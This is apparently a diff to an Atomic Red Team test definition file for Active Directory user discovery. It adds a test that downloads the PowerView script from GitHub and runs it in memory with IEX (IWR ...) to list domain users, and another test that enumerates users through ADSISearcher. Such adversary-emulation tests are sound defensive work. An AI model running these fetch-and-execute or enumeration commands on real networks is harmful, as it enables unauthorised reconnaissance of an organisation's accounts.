@@ -187,7 +187,7 @@ atomic_tests:
     domain:
       description: Domain FQDN
       type: String
-      default: contoso.com
+      default: $env:UserDnsDomain
     uac_prop:
       description: UAC Property to search
       type: String
@@ -214,3 +214,28 @@ atomic_tests:
     elevation_required: false
     command: |
       Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
+
+- name: Get-DomainUser with PowerView
+  auto_generated_guid: 93662494-5ed7-4454-a04c-8c8372808ac2
+  description: |
+    Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
+    name: powershell
+- name: Enumerate Active Directory Users with ADSISearcher
+  auto_generated_guid: 02e8be5a-3065-4e54-8cc8-a14d138834d3
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
+    Upon successful execution a listing of users will output with their paths in AD.
+    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
